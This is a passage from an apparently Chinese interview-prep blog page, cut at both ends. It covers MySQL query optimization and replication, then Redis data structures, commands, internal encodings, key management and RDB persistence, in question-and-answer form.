时，结果集会自动按照分组的字段进行排序，如果不关心结果集的顺序，可以使用 ORDER BY NULL 禁止排序。</p><p><strong>优化 LIMIT 分页</strong></p><p>在偏移量非常大的时候，需要查询很多条数据再舍弃，这样的代价非常高。要优化这种查询，要么是在页面中限制分页的数量，要么是优化大偏移量的性能。最简单的办法是尽可能地使用覆盖索引扫描，而不是查询所有的列，然后根据需要做一次关联操作再返回所需的列。</p><p>还有一种方法是从上一次取数据的位置开始扫描，这样就可以避免使用 OFFSET。其他优化方法还包括使用预先计算的汇总表，或者关联到一个冗余表，冗余表只包含主键列和需要做排序的数据列。</p><p><strong>优化 UNION 查询</strong></p><p>MySQL 通过创建并填充临时表的方式来执行 UNION 查询，除非确实需要服务器消除重复的行，否则一定要使用 UNION ALL，如果没有 ALL 关键字，MySQL 会给临时表加上 DISTINCT 选项，这会导致对整个临时表的数据做唯一性检查，这样做的代价非常高。</p><p><strong>使用用户自定义变量</strong></p><p>在查询中混合使用过程化和关系化逻辑的时候，自定义变量可能会非常有用。用户自定义变量是一个用来存储内容的临时容器，在连接 MySQL 的整个过程中都存在，可以在任何可以使用表达式的地方使用自定义变量。例如可以使用变量来避免重复查询刚刚更新过的数据、统计更新和插入的数量等。</p><p><strong>优化 INSERT</strong> </p><p>需要对一张表插入很多行数据时，应该尽量使用一次性插入多个值的 INSERT 语句，这种方式将缩减客户端与数据库之间的连接、关闭等消耗，效率比多条插入单个值的 INSERT 语句高。也可以关闭事务的自动提交，在插入完数据后提交。当插入的数据是按主键的顺序插入时，效率更高。</p><hr><h3 id="复制-2"><a href="#复制-2" class="headerlink" title="复制 2"></a>复制 2</h3><h4 id="Q1：MySQL-主从复制的作用？"><a href="#Q1：MySQL-主从复制的作用？" class="headerlink" title="Q1：MySQL 主从复制的作用？"></a>Q1：MySQL 主从复制的作用？</h4><p>复制解决的基本问题是让一台服务器的数据与其他服务器保持同步，一台主库的数据可以同步到多台备库上，备库本身也可以被配置成另外一台服务器的主库。主库和备库之间可以有多种不同的组合方式。</p><p>MySQL 支持两种复制方式：基于行的复制和基于语句的复制，基于语句的复制也称为逻辑复制，从 MySQL 3.23 版本就已存在，基于行的复制方式在 5.1 版本才被加进来。这两种方式都是通过在主库上记录二进制日志、在备库重放日志的方式来实现异步的数据复制。因此同一时刻备库的数据可能与主库存在不一致，并且无法包装主备之间的延迟。</p><p>MySQL 复制大部分是向后兼容的，新版本的服务器可以作为老版本服务器的备库，但是老版本不能作为新版本服务器的备库，因为它可能无法解析新版本所用的新特性或语法，另外所使用的二进制文件格式也可能不同。</p><p>复制解决的问题：数据分布、负载均衡、备份、高可用性和故障切换、MySQL 升级测试。</p><hr><h4 id="Q2：MySQL-主从复制的步骤？"><a href="#Q2：MySQL-主从复制的步骤？" class="headerlink" title="Q2：MySQL 主从复制的步骤？"></a>Q2：MySQL 主从复制的步骤？</h4><p>① 在主库上把数据更改记录到二进制日志中。② 备库将主库的日志复制到自己的中继日志中。 ③ 备库读取中继日志中的事件，将其重放到备库数据之上。</p><p>第一步是在主库上记录二进制日志，每次准备提交事务完成数据更新前，主库将数据更新的事件记录到二进制日志中。MySQL 会按事务提交的顺序而非每条语句的执行顺序来记录二进制日志，在记录二进制日志后，主库会告诉存储引擎可以提交事务了。</p><p>下一步，备库将主库的二进制日志复制到其本地的中继日志中。备库首先会启动一个工作的 IO 线程，IO 线程跟主库建立一个普通的客户端连接，然后在主库上启动一个特殊的二进制转储线程，这个线程会读取主库上二进制日志中的事件。它不会对事件进行轮询。如果该线程追赶上了主库将进入睡眠状态，直到主库发送信号量通知其有新的事件产生时才会被唤醒，备库 IO 线程会将接收到的事件记录到中继日志中。</p><p>备库的 SQL 线程执行最后一步，该线程从中继日志中读取事件并在备库执行，从而实现备库数据的更新。当 SQL 线程追赶上 IO 线程时，中继日志通常已经在系统缓存中，所以中继日志的开销很低。SQL 线程执行的时间也可以通过配置选项来决定是否写入其自己的二进制日志中。</p><hr><h2 id="Redis-37"><a href="#Redis-37" class="headerlink" title="Redis 37"></a>Redis 37</h2><h3 id="架构-3"><a href="#架构-3" class="headerlink" title="架构 3"></a>架构 3</h3><h4 id="Q1：Redis-有什么特点？"><a href="#Q1：Redis-有什么特点？" class="headerlink" title="Q1：Redis 有什么特点？"></a>Q1：Redis 有什么特点？</h4><p><strong>基于键值对的数据结构服务器</strong></p><p>Redis 中的值不仅可以是字符串，还可以是具体的数据结构，这样不仅能应用于多种场景开发，也可以提高开发效率。它主要提供五种数据结构：字符串、哈希、列表、集合、有序集合，同时在字符串的基础上演变出了 Bitmaps 和 HyperLogLog 两种数据结构，Redis 3.2 还加入了有关 GEO 地理信息定位的功能。</p><p><strong>丰富的功能</strong></p><p>① 提供了键过期功能，可以实现缓存。② 提供了发布订阅功能，可以实现消息系统。③ 支持 Lua 脚本，可以创造新的 Redis 命令。④ 提供了简单的事务功能，能在一定程度上保证事务特性。⑤ 提供了流水线功能，客户端能将一批命令一次性传到 Redis，减少网络开销。</p><p><strong>简单稳定</strong></p><p>Redis 的简单主要体现在三个方面：① 源码很少，早期只有 2 万行左右，在 3.0 版本由于添加了集群特性，增加到了 5 万行左右，相对于很多 NoSQL 数据库来说代码量要少很多。② 采用单线程模型，使得服务端处理模型更简单，也使客户端开发更简单。③ 不依赖底层操作系统的类库，自己实现了事件处理的相关功能。虽然 Redis 比较简单，但也很稳定。</p><p><strong>客户端语言多</strong></p><p>Redis 提供了简单的 TCP 通信协议，很多编程语言可以方便地接入 Redis，例如 Java、PHP、Python、C、C++ 等。</p><p><strong>持久化</strong></p><p>通常来说数据放在内存中是不安全的，一旦发生断电或故障数据就可能丢失，因此 Redis 提供了两种持久化方式 RDB 和 AOF 将内存的数据保存到硬盘中。</p><p><strong>高性能</strong></p><p>Redis 使用了单线程架构和 IO 多路复用模型来实现高性能的内存数据库服务。</p><p>每次客户端调用都经历了发送命令、执行命令、返回结果三个过程，因为 Redis 是单线程处理命令的，所以一条命令从客户端到达服务器不会立即执行，所有命令都会进入一个队列中，然后逐个被执行。客户端的执行顺序可能不确定，但是可以确定不会有两条命令被同时执行，不存在并发问题。</p><p>通常来说单线程处理能力要比多线程差，Redis 快的原因：① 纯内存访问，Redis 将所有数据放在内存中。② 非阻塞 IO，Redis 使用 epoll 作为 IO 多路复用技术的实现，再加上 Redis 本身的事件处理模型将 epoll 中的连接、读写、关闭都转换为时间，不在网络 IO 上浪费过多的时间。③ 单线程避免了线程切换和竞争产生的消耗。单线程的一个问题是对于每个命令的执行时间是有要求的，如果某个命令执行时间过长会造成其他命令的阻塞，对于 Redis 这种高性能服务来说是致命的，因此 Redis 是面向快速执行场景的数据库。</p><hr><h4 id="Q2：Redis-的数据结构有哪些？"><a href="#Q2：Redis-的数据结构有哪些？" class="headerlink" title="Q2：Redis 的数据结构有哪些？"></a>Q2：Redis 的数据结构有哪些？</h4><p>可以使用 type 命令查看当前键的数据类型结构，它们分别是：string、hash、list、set、zset，但这些只是 Redis 对外的数据结构。实际上每种数据结构都有自己底层的内部编码实现，这样 Redis 会在合适的场景选择合适的内部编码，string 包括了 raw、int 和 embstr，hash 包括了 hashtable 和 ziplist，list 包括了 linkedlist 和 ziplist，set 包括了 hashtable 和 intset，zset 包括了 skiplist 和 ziplist。可以使用 <code>object encoding</code> 查看内部编码。</p><hr><h4 id="Q3：Redis-为什么要使用内部编码？"><a href="#Q3：Redis-为什么要使用内部编码？" class="headerlink" title="Q3：Redis 为什么要使用内部编码？"></a>Q3：Redis 为什么要使用内部编码？</h4><p>① 可以改进内部编码，而对外的数据结构和命令没有影响。</p><p>② 多种内部编码实现可以在不同场景下发挥各自的优势，例如 ziplist 比较节省内存，但在列表元素较多的情况下性能有所下降，这时 Redis 会根据配置选项将列表类型的内部实现转换为 linkedlist。</p><hr><h3 id="string-4"><a href="#string-4" class="headerlink" title="string 4"></a>string 4</h3><h4 id="Q1：简单说一说-string-类型"><a href="#Q1：简单说一说-string-类型" class="headerlink" title="Q1：简单说一说 string 类型"></a>Q1：简单说一说 string 类型</h4><p>字符串类型是 Redis 最基础的数据结构，键都是字符串类型，而且其他几种数据结构都是在字符串类型的基础上构建的。字符串类型的值可以实际可以是字符串（简单的字符串、复杂的字符串如 JSON、XML）、数字（整形、浮点数）、甚至二进制（图片、音频、视频），但是值最大不能超过 512 MB。</p><hr><h4 id="Q2：你知道哪些-string-的命令？"><a href="#Q2：你知道哪些-string-的命令？" class="headerlink" title="Q2：你知道哪些 string 的命令？"></a>Q2：你知道哪些 string 的命令？</h4><p><strong>设置值</strong></p><p><code>set key value [ex seconds] [px millseconds] [nx|xx]</code></p><ul><li>ex seconds：为键设置秒级过期时间，跟 setex 效果一样</li><li>px millseconds：为键设置毫秒级过期时间</li><li>nx：键必须不存在才可以设置成功，用于添加，跟 setnx 效果一样。由于 Redis 的单线程命令处理机制，如果多个客户端同时执行，则只有一个客户端能设置成功，可以用作分布式锁的一种实现。</li><li>xx：键必须存在才可以设置成功，用于更新</li></ul><p><strong>获取值</strong></p><p><code>get key</code>，如果不存在返回 nil</p><p><strong>批量设置值</strong></p><p><code>mset key value [key value...]</code></p><p><strong>批量获取值</strong></p><p><code>mget key [key...]</code></p><p>批量操作命令可以有效提高开发效率，假如没有 mget，执行 n 次 get 命令需要 n 次网络时间 + n 次命令时间，使用 mget 只需要 1 次网络时间 + n 次命令时间。Redis 可以支持每秒数万的读写操作，但这指的是 Redis 服务端的处理能力，对于客户端来说一次命令处理命令时间还有网络时间。因为 Redis 的处理能力已足够高，对于开发者来说，网络可能会成为性能瓶颈。</p><p><strong>计数</strong></p><p><code>incr key</code></p><p>incr 命令用于对值做自增操作，返回结果分为三种：① 值不是整数返回错误。② 值是整数，返回自增后的结果。③ 值不存在，按照值为 0 自增，返回结果 1。除了 incr 命令，还有自减 decr、自增指定数字 incrby、自减指定数组 decrby、自增浮点数 incrbyfloat。</p><hr><h4 id="Q3：string-的内部编码是什么？"><a href="#Q3：string-的内部编码是什么？" class="headerlink" title="Q3：string 的内部编码是什么？"></a>Q3：string 的内部编码是什么？</h4><ul><li>int：8 个字节的长整形</li><li>embstr：小于等于 39 个字节的字符串</li><li>raw：大于 39 个字节的字符串</li></ul><hr><h4 id="Q4：string-的应用场景有什么？"><a href="#Q4：string-的应用场景有什么？" class="headerlink" title="Q4：string 的应用场景有什么？"></a>Q4：string 的应用场景有什么？</h4><p><strong>缓存功能</strong></p><p>Redis 作为缓存层，MySQL 作为存储层，首先从 Redis 获取数据，如果失败就从 MySQL 获取并将结果写回 Redis 并添加过期时间。</p><p><strong>计数</strong></p><p>Redis 可以实现快速计数功能，例如视频每播放一次就用 incy 把播放数加 1。</p><p><strong>共享 Session</strong></p><p>一个分布式 Web 服务将用户的 Session 信息保存在各自服务器，但会造成一个问题，出于负载均衡的考虑，分布式服务会将用户的访问负载到不同服务器上，用户刷新一次可能会发现需要重新登陆。为解决该问题，可以使用 Redis 将用户的 Session 进行集中管理，在这种模式下只要保证 Redis 是高可用和扩展性的，每次用户更新或查询登录信息都直接从 Redis 集中获取。</p><p><strong>限速</strong></p><p>例如为了短信接口不被频繁访问会限制用户每分钟获取验证码的次数或者网站限制一个 IP 地址不能在一秒内访问超过 n 次。可以使用键过期策略和自增计数实现。</p><hr><h3 id="hash-4"><a href="#hash-4" class="headerlink" title="hash 4"></a>hash 4</h3><h4 id="Q1：简单说一说-hash-类型"><a href="#Q1：简单说一说-hash-类型" class="headerlink" title="Q1：简单说一说 hash 类型"></a>Q1：简单说一说 hash 类型</h4><p>哈希类型指键值本身又是一个键值对结构，哈希类型中的映射关系叫 field-value，这里的 value 是指 field 对于的值而不是键对于的值。</p><hr><h4 id="Q2：你知道哪些-hash-的命令？"><a href="#Q2：你知道哪些-hash-的命令？" class="headerlink" title="Q2：你知道哪些 hash 的命令？"></a>Q2：你知道哪些 hash 的命令？</h4><p><strong>设置值</strong></p><p><code>hset key field value</code>，如果设置成功会返回 1，反之会返回 0，此外还提供了 hsetnx 命令，作用和 setnx 类似，只是作用于由键变为 field。</p><p><strong>获取值</strong></p><p><code>hget key field</code>，如果不存在会返回 nil。</p><p><strong>删除 field</strong></p><p><code>hdel key field [field...]</code>，会删除一个或多个 field，返回结果为删除成功 field 的个数。</p><p><strong>计算 field 个数</strong></p><p><code>hlen key</code></p><p><strong>批量设置或获取 field-value</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hmget key field [field...]</span><br><span class="line">hmset key field value [field value...]</span><br></pre></td></tr></table></figure><p><strong>判断 field 是否存在</strong></p><p><code>hexists key field</code>，存在返回 1，否则返回  0。</p><p><strong>获取所有的 field</strong></p><p><code>hkeys key</code>，返回指定哈希键的所有 field。</p><p><strong>获取所有 value</strong></p><p><code>hvals key</code>，获取指定键的所有 value。</p><p><strong>获取所有的 field-value</strong></p><p><code>hgetall key</code>，获取指定键的所有 field-value。</p><hr><h4 id="Q3：hash-的内部编码是什么？"><a href="#Q3：hash-的内部编码是什么？" class="headerlink" title="Q3：hash 的内部编码是什么？"></a>Q3：hash 的内部编码是什么？</h4><p>ziplist 压缩列表：当哈希类型元素个数和值小于配置值（默认 512 个和 64 字节）时会使用 ziplist 作为内部实现，使用更紧凑的结构实现多个元素的连续存储，在节省内存方面比 hashtable 更优秀。</p><p>hashtable 哈希表：当哈希类型无法满足 ziplist 的条件时会使用 hashtable 作为哈希的内部实现，因为此时 ziplist 的读写效率会下降，而 hashtable 的读写时间复杂度都为 O(1)。</p><hr><h4 id="Q4：hash-的应用场景有什么？"><a href="#Q4：hash-的应用场景有什么？" class="headerlink" title="Q4：hash 的应用场景有什么？"></a>Q4：hash 的应用场景有什么？</h4><p>缓存用户信息，每个用户属性使用一对 field-value，但只用一个键保存。</p><p>优点：简单直观，如果合理使用可以减少内存空间使用。</p><p>缺点：要控制哈希在 ziplist 和 hashtable 两种内部编码的转换，hashtable 会消耗更多内存。</p><hr><h3 id="list-4"><a href="#list-4" class="headerlink" title="list 4"></a>list 4</h3><h4 id="Q1：简单说一说-list-类型"><a href="#Q1：简单说一说-list-类型" class="headerlink" title="Q1：简单说一说 list 类型"></a>Q1：简单说一说 list 类型</h4><p>list 是用来存储多个有序的字符串，列表中的每个字符串称为元素，一个列表最多可以存储 2^32^-1 个元素。可以对列表两端插入（push）和弹出（pop），还可以获取指定范围的元素列表、获取指定索引下标的元素等。列表是一种比较灵活的数据结构，它可以充当栈和队列的角色，在实际开发中有很多应用场景。</p><p>list 有两个特点：① 列表中的元素是有序的，可以通过索引下标获取某个元素或者某个范围内的元素列表。② 列表中的元素可以重复。</p><hr><h4 id="Q2：你知道哪些-list-的命令？"><a href="#Q2：你知道哪些-list-的命令？" class="headerlink" title="Q2：你知道哪些 list 的命令？"></a>Q2：你知道哪些 list 的命令？</h4><p><strong>添加</strong></p><p>从右边插入元素：<code>rpush key value [value...]</code></p><p>从左到右获取列表的所有元素：<code>lrange 0 -1</code></p><p>从左边插入元素：<code>lpush key value [value...]</code></p><p>向某个元素前或者后插入元素：<code>linsert key before|after pivot value</code>，会在列表中找到等于 pivot 的元素，在其前或后插入一个新的元素 value。</p><p><strong>查找</strong></p><p>获取指定范围内的元素列表：<code>lrange key start end</code>，索引从左到右的范围是 0<del>N-1，从右到左是 -1</del>-N，lrange 中的 end 包含了自身。</p><p>获取列表指定索引下标的元素：<code>lindex key index</code>，获取最后一个元素可以使用 <code>lindex key -1</code>。</p><p>获取列表长度：<code>llen key</code></p><p><strong>删除</strong></p><p>从列表左侧弹出元素：<code>lpop key</code></p><p>从列表右侧弹出元素：<code>rpop key</code></p><p>删除指定元素：<code>lrem key count value</code>，如果 count 大于 0，从左到右删除最多 count 个元素，如果 count 小于 0，从右到左删除最多个 count 绝对值个元素，如果 count 等于 0，删除所有。</p><p>按照索引范围修剪列表：<code>ltrim key start end</code>，只会保留 start ~ end 范围的元素。</p><p><strong>修改</strong></p><p>修改指定索引下标的元素：<code>lset key index newValue</code>。</p><p><strong>阻塞操作</strong></p><p>阻塞式弹出：<code>blpop/brpop key [key...] timeout</code>，timeout 表示阻塞时间。</p><p>当列表为空时，如果 timeout &#x3D; 0，客户端会一直阻塞，如果在此期间添加了元素，客户端会立即返回。</p><p>如果是多个键，那么brpop会从左至右遍历键，一旦有一个键能弹出元素，客户端立即返回。</p><p>如果多个客户端对同一个键执行 brpop，那么最先执行该命令的客户端可以获取弹出的值。</p><hr><h4 id="Q3：list-的内部编码是什么？"><a href="#Q3：list-的内部编码是什么？" class="headerlink" title="Q3：list 的内部编码是什么？"></a>Q3：list 的内部编码是什么？</h4><p>ziplist 压缩列表：跟哈希的 zipilist 相同，元素个数和大小小于配置值（默认 512 个和 64 字节）时使用。</p><p>linkedlist 链表：当列表类型无法满足 ziplist 的条件时会使用linkedlist。</p><p>Redis 3.2 提供了 quicklist 内部编码，它是以一个 ziplist 为节点的 linkedlist，它结合了两者的优势，为列表类提供了一种更为优秀的内部编码实现。</p><hr><h4 id="Q4：list-的应用场景有什么？"><a href="#Q4：list-的应用场景有什么？" class="headerlink" title="Q4：list 的应用场景有什么？"></a>Q4：list 的应用场景有什么？</h4><p><strong>消息队列</strong></p><p>Redis 的 lpush + brpop 即可实现阻塞队列，生产者客户端使用 lpush 从列表左侧插入元素，多个消费者客户端使用 brpop 命令阻塞式地抢列表尾部的元素，多个客户端保证了消费的负载均衡和高可用性。</p><p><strong>文章列表</strong></p><p>每个用户有属于自己的文章列表，现在需要分页展示文章列表，就可以考虑使用列表。因为列表不但有序，同时支持按照索引范围获取元素。每篇文章使用哈希结构存储。</p><p>lpush + lpop &#x3D; 栈、lpush + rpop  &#x3D; 队列、lpush + ltrim &#x3D; 优先集合、lpush + brpop &#x3D; 消息队列。</p><hr><h3 id="set-4"><a href="#set-4" class="headerlink" title="set 4"></a>set 4</h3><h4 id="Q1：简单说一说-set-类型"><a href="#Q1：简单说一说-set-类型" class="headerlink" title="Q1：简单说一说 set 类型"></a>Q1：简单说一说 set 类型</h4><p>集合类型也是用来保存多个字符串元素，和列表不同的是集合不允许有重复元素，并且集合中的元素是无序的，不能通过索引下标获取元素。一个集合最多可以存储 2^32^-1 个元素。Redis 除了支持集合内的增删改查，还支持多个集合取交集、并集、差集。</p><hr><h4 id="Q2：你知道哪些-set-的命令？"><a href="#Q2：你知道哪些-set-的命令？" class="headerlink" title="Q2：你知道哪些 set 的命令？"></a>Q2：你知道哪些 set 的命令？</h4><p><strong>添加元素</strong></p><p><code>sadd key element [element...]</code>，返回结果为添加成功的元素个数。</p><p><strong>删除元素</strong></p><p><code>srem key element [element...]</code>，返回结果为成功删除的元素个数。</p><p><strong>计算元素个数</strong></p><p><code>scard key</code>，时间复杂度为 O(1)，会直接使用 Redis 内部的遍历。</p><p><strong>判断元素是否在集合中</strong></p><p><code>sismember key element</code>，如果存在返回 1，否则返回 0。</p><p><strong>随机从集合返回指定个数个元素</strong></p><p><code>srandmember key [count]</code>，如果不指定 count 默认为 1。</p><p><strong>从集合随机弹出元素</strong></p><p><code>spop key</code>，可以从集合中随机弹出一个元素。</p><p><strong>获取所有元素</strong></p><p><code>smembers key</code></p><p><strong>求多个集合的交集&#x2F;并集&#x2F;差集</strong></p><p><code>sinter key [key...]</code></p><p><code>sunion key [key...]</code></p><p><code>sdiff key [key...]</code></p><p><strong>保存交集、并集、差集的结果</strong></p><p><code>sinterstore/sunionstore/sdiffstore destination key [key...]</code></p><p>集合间运算在元素较多情况下比较耗时，Redis 提供这三个指令将集合间交集、并集、差集的结果保存在 destination key 中。</p><hr><h4 id="Q3：set-的内部编码是什么？"><a href="#Q3：set-的内部编码是什么？" class="headerlink" title="Q3：set 的内部编码是什么？"></a>Q3：set 的内部编码是什么？</h4><p>intset 整数集合：当集合中的元素个数小于配置值（默认 512 个时），使用 intset。</p><p>hashtable 哈希表：当集合类型无法满足 intset 条件时使用 hashtable。当某个元素不为整数时，也会使用 hashtable。</p><hr><h4 id="Q4：set-的应用场景有什么？"><a href="#Q4：set-的应用场景有什么？" class="headerlink" title="Q4：set 的应用场景有什么？"></a>Q4：set 的应用场景有什么？</h4><p>set 比较典型的使用场景是标签，例如一个用户可能与娱乐、体育比较感兴趣，另一个用户可能对例时、新闻比较感兴趣，这些兴趣点就是标签。这些数据对于用户体验以及增强用户黏度比较重要。</p><p>sadd &#x3D; 标签、spop&#x2F;srandmember &#x3D; 生成随机数，比如抽奖、sadd + sinter &#x3D; 社交需求。</p><hr><h3 id="zset-4"><a href="#zset-4" class="headerlink" title="zset 4"></a>zset 4</h3><h4 id="Q1：简单说一说-zset-类型"><a href="#Q1：简单说一说-zset-类型" class="headerlink" title="Q1：简单说一说 zset 类型"></a>Q1：简单说一说 zset 类型</h4><p>有序集合保留了集合不能有重复成员的特性，不同的是可以排序。但是它和列表使用索引下标作为排序依据不同的是，他给每个元素设置一个分数（score）作为排序的依据。有序集合提供了获取指定分数和元素查询范围、计算成员排名等功能。</p><hr><h4 id="Q2：你知道哪些-zset-的命令？"><a href="#Q2：你知道哪些-zset-的命令？" class="headerlink" title="Q2：你知道哪些 zset 的命令？"></a>Q2：你知道哪些 zset 的命令？</h4><p><strong>添加成员</strong></p><p><code>zadd key score member [score member...]</code>，返回结果是成功添加成员的个数</p><p>Redis 3.2 为 zadd 命令添加了 nx、xx、ch、incr 四个选项：</p><ul><li>nx：member 必须不存在才可以设置成功，用于添加。</li><li>xx：member 必须存在才能设置成功，用于更新。</li><li>ch：返回此次操作后，有序集合元素和分数变化的个数。</li><li>incr：对 score 做增加，相当于 zincrby。</li></ul><p>zadd 的时间复杂度为 O(log<del>n</del>)，sadd 的时间复杂度为 O(1)。</p><p><strong>计算成员个数</strong></p><p><code>zcard key</code>，时间复杂度为 O(1)。</p><p><strong>计算某个成员的分数</strong></p><p><code>zscore key member</code> ，如果不存在则返回 nil。</p><p><strong>计算成员排名</strong></p><p><code>zrank key member</code>，从低到高返回排名。</p><p><code>zrevrank key member</code>，从高到低返回排名。</p><p><strong>删除成员</strong></p><p><code>zrem key member [member...]</code>，返回结果是成功删除的个数。</p><p><strong>增加成员的分数</strong></p><p><code>zincrby key increment member</code></p><p><strong>返回指定排名范围的成员</strong></p><p><code>zrange key start end [withscores]</code>，从低到高返回</p><p><code>zrevrange key start end [withscores]</code>， 从高到底返回</p><p><strong>返回指定分数范围的成员</strong></p><p><code>zrangebyscore key min max [withscores] [limit offset count]</code>，从低到高返回</p><p><code>zrevrangebyscore key min max [withscores] [limit offset count]</code>， 从高到底返回</p><p><strong>返回指定分数范围成员个数</strong></p><p><code>zcount key min max</code></p><p><strong>删除指定分数范围内的成员</strong></p><p><code>zremrangebyscore key min max</code></p><p><strong>交集和并集</strong></p><p><code>zinterstore/zunionstore destination numkeys key [key...] [weights weight [weight...]] [aggregate sum|min|max]</code></p><ul><li><p><code>destination</code>：交集结果保存到这个键</p></li><li><p><code>numkeys</code>：要做交集计算键的个数</p></li><li><p><code>key</code>：需要做交集计算的键</p></li><li><p><code>weight</code>：每个键的权重，默认 1</p></li><li><p><code>aggregate sum|min|max</code>：计算交集后，分值可以按和、最小值、最大值汇总，默认 sum。</p></li></ul><hr><h4 id="Q3：zset-的内部编码是什么？"><a href="#Q3：zset-的内部编码是什么？" class="headerlink" title="Q3：zset 的内部编码是什么？"></a>Q3：zset 的内部编码是什么？</h4><p>ziplist 压缩列表：当有序集合元素个数和值小于配置值（默认128 个和 64 字节）时会使用 ziplist 作为内部实现。</p><p>skiplist 跳跃表：当 ziplist 不满足条件时使用，因为此时 ziplist 的读写效率会下降。</p><hr><h4 id="Q4：zset-的应用场景有什么？"><a href="#Q4：zset-的应用场景有什么？" class="headerlink" title="Q4：zset 的应用场景有什么？"></a>Q4：zset 的应用场景有什么？</h4><p>有序集合的典型使用场景就是排行榜系统，例如用户上传了一个视频并获得了赞，可以使用 zadd 和 zincrby。如果需要将用户从榜单删除，可以使用 zrem。如果要展示获取赞数最多的十个用户，可以使用 zrange。</p><hr><h3 id="键和数据库管理-5"><a href="#键和数据库管理-5" class="headerlink" title="键和数据库管理 5"></a>键和数据库管理 5</h3><h4 id="Q1：如何对键重命名？"><a href="#Q1：如何对键重命名？" class="headerlink" title="Q1：如何对键重命名？"></a>Q1：如何对键重命名？</h4><p><code>rename key newkey</code></p><p>如果 rename 前键已经存在，那么它的值也会被覆盖。为了防止强行覆盖，Redis 提供了 renamenx 命令，确保只有 newkey 不存在时才被覆盖。由于重命名键期间会执行 del 命令删除旧的键，如果键对应值比较大会存在阻塞的可能。</p><hr><h4 id="Q2：如何设置键过期？"><a href="#Q2：如何设置键过期？" class="headerlink" title="Q2：如何设置键过期？"></a>Q2：如何设置键过期？</h4><p><code>expire key seconds</code>：键在 seconds 秒后过期。</p><p>如果过期时间为负值，键会被立即删除，和 del 命令一样。persist 命令可以将键的过期时间清除。</p><p>对于字符串类型键，执行 set 命令会去掉过期时间，set 命令对应的函数 setKey 最后执行了 removeExpire 函数去掉了过期时间。setex 命令作为 set + expire 的组合，不单是原子执行并且减少了一次网络通信的时间。</p><hr><h4 id="Q3：如何进行键迁移？"><a href="#Q3：如何进行键迁移？" class="headerlink" title="Q3：如何进行键迁移？"></a>Q3：如何进行键迁移？</h4><ul><li><p>move</p><p>move 命令用于在 Redis 内部进行数据迁移，<code>move key db</code> 把指定的键从源数据库移动到目标数据库中。</p></li><li><p>dump + restore</p><p>可以实现在不同的 Redis 实例之间进行数据迁移，分为两步：</p><p>① <code>dump key</code> ，在源 Redis 上，dump 命令会将键值序列化，格式采用 RDB 格式。</p><p>② <code>restore key ttl value</code>，在目标 Redis 上，restore 命令将序列化的值进行复原，ttl 代表过期时间， ttl &#x3D; 0 则没有过期时间。</p><p>整个迁移并非原子性的，而是通过客户端分步完成，并且需要两个客户端。</p></li><li><p>migrate</p><p>实际上 migrate 命令就是将 dump、restore、del 三个命令进行组合，从而简化操作流程。migrate 具有原子性，支持多个键的迁移，有效提高了迁移效率。实现过程和 dump + restore 类似，有三点不同：</p><p>① 整个过程是原子执行，不需要在多个 Redis 实例开启客户端。</p><p>② 数据传输直接在源 Redis 和目标 Redis 完成。</p><p>③ 目标 Redis 完成 restore 后会发送 OK 给源 Redis，源 Redis 接收后根据 migrate 对应选项来决定是否在源 Redis 上删除对应键。</p></li></ul><hr><h4 id="Q4：如何切换数据库？"><a href="#Q4：如何切换数据库？" class="headerlink" title="Q4：如何切换数据库？"></a>Q4：如何切换数据库？</h4><p><code>select dbIndex</code>，Redis 中默认配置有 16 个数据库，例如 select 0 将切换到第一个数据库，数据库之间的数据是隔离的。</p><hr><h4 id="Q5：如何清除数据库？"><a href="#Q5：如何清除数据库？" class="headerlink" title="Q5：如何清除数据库？"></a>Q5：如何清除数据库？</h4><p>用于清除数据库，flushdb 只清除当前数据库，flushall 会清除所有数据库。如果当前数据库键值数量比较多，flushdb&#x2F;flushall 存在阻塞 Redis 的可能性。</p><hr><h3 id="持久化-9"><a href="#持久化-9" class="headerlink" title="持久化 9"></a>持久化 9</h3><h4 id="Q1：RDB-持久化的原理？"><a href="#Q1：RDB-持久化的原理？" class="headerlink" title="Q1：RDB 持久化的原理？"></a>Q1：RDB 持久化的原理？</h4><p>RDB 持久化是把当前进程数据生成快照保存到硬盘的过程，触发 RDB 持久化过程分为手动触发和自动触发。</p><p>手动触发分别对应 save 和 bgsave 命令：</p><ul><li>save：阻塞当前 Redis 服务器，直到 RDB 过程完成为止，对于内存比较大的实例会造成长时间阻塞，线上环境不建议使用。</li><li>bgasve：Redis 进程执行 fork 操作创建子进程，RDB 持久化过程由子进程负责，完成后自动结束。阻塞只发生在 fork 阶段，一般时间很短。bgsave 是针对 save 阻塞问题做的优化，因此 Redis 内部所有涉及 RDB 的操作都采用 bgsave 的方式，而 save 方式已经废弃。</li></ul><p>除了手动触发外，Redis 内部还存在自动触发 RDB 的持久化机制，例如：</p><ul><li>使用 save 相关配置，如 save m n，表示 m 秒内数据集存在 n 次修改时，自动触发 bgsave。</li><li>如果从节点执行全量复制操作，主节点自动执行 bgsave 生成 RDB 文件并发送给从节点。</li><li>执行 debug reload 命令重新加载 Redis 时也会自动触发 save 操作。</li><li>默认情况下执行 shutdown 命令时，如果没有开启 AOF 持久化功能则自动执行 bgsave。</li></ul><hr><h4 id="Q2：bgsave-的原理？"><a href="#Q2：bgsave-的原理？" class="headerlink" title="Q2：bgsave 的原理？"></a>Q2：bgsave 的原理？</h4><p>① 执行 bgsave 命令，Redis 父进程判断当前是否存在正在执行的子进程，如 RDB&#x2F;AOF 子进程，如果存在 bgsave 命令直接返回。</p><p>② 父进程执行 fork 操作创建子进程，fork 操作过程中父进程会阻塞。</p><p>③ 父进程 fork 完成后，bgsave 命令返回并不再阻塞父进程，可以继续响应其他命令。</p><p>④ 子进程创建 RDB 文件，根据父进程内存生成临时快照文件，完成后对原有文件进行原子替换。</p><p>⑤ 进程发送信号给父进程表示完成，父进程更新统计信息。</p><hr><h4 id="Q3：RDB-持久化的优点？"><a href="#Q3：RDB-持久化的优点？" class="headerlink" title="Q3：RDB 持久化的优点？"></a>Q3：RDB 持久化的优点？</h4><p>RDB 是一个紧凑压缩的二进制文件，代表 Redis 在某个时间点上的数据快照。非常适合于备份，全量复制等场景。例如每 6 个消时执行 bgsave 备份，并把 RDB 文件拷贝到远程机器或者文件系统中，用于灾难恢复。</p><p>Redis 加载 RDB 恢复数据远远快于 AOF 的方式。</p><hr><h4 id="Q4：RDB-持久化的缺点？"><a href="#Q4：RDB-持久化的缺点？" class="headerlink" title="Q4：RDB 持久化的缺点？"></a>Q4：RDB 持久化的缺点？</h4><p>RDB 方式数据无法做到实时持久化&#x2F;秒级持久化，因为 